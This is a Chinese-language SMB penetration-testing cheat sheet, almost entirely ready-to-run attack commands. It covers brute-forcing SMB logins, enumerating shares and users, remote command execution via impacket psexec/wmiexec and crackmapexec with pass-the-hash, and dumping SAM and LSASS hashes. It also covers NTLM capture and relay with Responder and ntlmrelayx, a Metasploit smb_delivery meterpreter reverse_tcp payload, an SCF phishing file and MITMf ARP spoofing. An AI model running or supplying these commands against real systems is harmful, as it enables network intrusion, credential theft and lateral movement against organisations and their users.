# SMB服务

SMB暴力破解
```Bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

搜索漏洞利用
```Bash
Metasploit:
msf> search type:exploit platform:windows target:2008 smb
```

```Bash
searchsploit microsoft smb
```

## 枚举信息

### 枚举SMB主机

```Bash
nmap -p 139,445 --script=smb-os-discovery.nse IP地址  //扫描IP地址的SMB服务及版本
nmap --script smb-vuln* -p 139,445 IP地址  //检测SMB服务是否存在漏洞
nmap --script smb-enum-shares -p139,445 IP地址  //列出共享
enum4linux -a IP地址  //获取RID 范围、用户名、工作组、Nbtstat、会话、SID、系统等信息
enum4linux -a -l -s IP地址  //枚举共享目录
smbmap -H IP地址  //枚举整域共享和权限
smbclient -L //<目标IP>  //列出目标系统上的SMB共享
nmblookup -A IP地址 //枚举主机名
nbtscan IP地址  //枚举主机名

Metasploit
auxiliary/scanner/smb/smb_version  //扫描版本
```

```Bash
#!/bin/sh
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```

### 凭据枚举信息

```Bash
enum4linux -a -u 用户名 -p 密码 IP地址  //额外的组、组成员、SID等信息

cd /usr/share/doc/python3-impacket/examples
python samrdump.py -port 445 域/用户名:密码@目标IP地址  //列出所有系统共享、用户账户及目标IP地址在本地网络中存储的其它信息
python rpcdump.py -port 445 域/用户名:密码@IP地址  //列出所有注册的RPC端点

smbmap -H 192.168.1.17 -u [username] -p [password]  //枚举共享
crackmapexec smb 192.168.1.0/24 -u 用户名 -p '密码' --shares  //列出共享

# 枚举共享并连接和下载文件
smbclient -L IP地址
smbclient //IP地址/共享目录
get file.txt

# Metasploit枚举共享
use auxiliary/scanner/smb/smb_enumshares
set rhosts IP地址
smbuser [username]
smbuser [password]
exploit
```

### 枚举用户

```Bash
crackmapexec smb IP地址 -u 用户名 -p 密码 --users  //枚举目标IP地址用户
crackmapexec smb IP地址 -u 用户名 -p 密码 --groups  //枚举域组
crackmapexec smb IP地址 -u 用户名 -p 密码 --groups --loggedon-users  //枚举域组和登录用户信息

rpcclient -U "用户名%密码" IP地址
enumdomusers  //列出域用户
enumdomgroups  //列出域组
netshareenum  //列出共享驱动器
netshareenumall  //列出所有共享驱动器
queryuser [RID]  //查看特定用户信息

rpcclient -U "用户名%密码" -c '命令' <目标IP>  //登录到远程机器
rpcclient -U "用户名%密码" -c 'enumdomusers' <目标IP>  //列出域用户
rpcclient -U "用户名%密码" -c 'queryuser 用户ID' <目标IP>  //获取特定用户的信息


Metaslpoit
auxiliary/scanner/smb/smb_lookupsid

/usr/share/doc/python3-impacket/examples
python lookupsid.py 域/用户名:密码@目标IP地址  //枚举到的本地用户和域用户

ldapsearch -x -b "DC=[Domain Name],DC=LOCAL" -s sub "(&(objectclass=user))" -h [IP地址] | grep -i samaccountname: | cut -f 2 -d " "

for i in $(seq 500 1100);do rpcclient -N -U "" [IP地址] -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

### windows枚举

```Bash
net view \\IP地址 /all  //列出目标计算机上的所有共享
nbtstat -A IP地址  //读取本地计算机和远程计算机的 NetBIOS 名称表
net user \\IP地址\share  //连接指定共享目录
net use
```

### 域共享文件夹枚举

```Bash
https://github.com/SnaffCon/Snaffler
Snaffler.exe -s -d domain.local -o snaffler.log -v data
sudo crackmapexec smb 10 -u username -p pass -M spider_plus --share 'Department Shares'
```

## 执行系统命令

### Impacket

```Bash
/usr/share/doc/python3-impacket/examples
python smbexec.py -p 445 域/用户:密码@IP地址 -shell-type cmd/powershell
python atexec.py 域/用户名:密码@IP地址 命令
python psexec.py 域/用户名:密码@IP地址
psexec \\\\<目标IP> -u <用户名> -p <密码> cmd.exe /c "要执行的命令"
python wmiexec.py 域/用户名:密码@IP地址
python dcomexec.py 域/用户名:密码@IP地址
```

```Bash
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t

./wmiexec.py [[domain/]username[:password]@]<targetName or address>
./wmiexec.py -hashes LM:NT administrator@10.10.10.103

./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103

./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```

### CrackMapExec

```Bash
crackmapexec smb IP地址 -u 用户名 -p 密码 -x 命令

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' //执行Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami  //执行cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami
# --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```

### Metasploit

```Bash
exploit/windows/smb/psexec
```

## 窃取NTLM

### exploit/windows/smb/smb_delivery

```Bash
use exploit/windows/smb/smb_delivery
set payload windows/meterpreter/reverse_tcp
set srvhost 攻击者主机IP地址
exploit
```

### 捕获响应

```Bash
use auxiliary/server/capture/smb
set srvhost 攻击者主机IP地址
set johnpwfile /root/
exploit
```

```Bash
use auxiliary/spoof/nbns/nbns_response
set spoofip 重定向地址
set interface eth0
exploit
```

### Responder

```Bash
responder -I eth0 -wF
```

## SMB中继

```Bash
responder -I eth0 -v
python ntlmrelayx.py -t smb://目标主机IP地址 --no-smb-server
```

## SMB钓鱼

### Responder
```Bash
responder -I eth0 -wF -P
```

### SCF文件

```Bash
[Shell]
Command=2
IconFile=\\\\攻击者主机IP地址\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop
```

### auxiliary/server/capture/smb

```Bash
use auxiliary/server/capture/smb
set JOHNPWFILE /path/to/john.pot
exploit
```

### MITMF

```html
img src="\\主机IP地址\image.jpg"
```

```Bash
python mitmf.py -spoof -arp -smbtrap -target 受害者IP地址 -gateway 网关地址 -i eth0
```
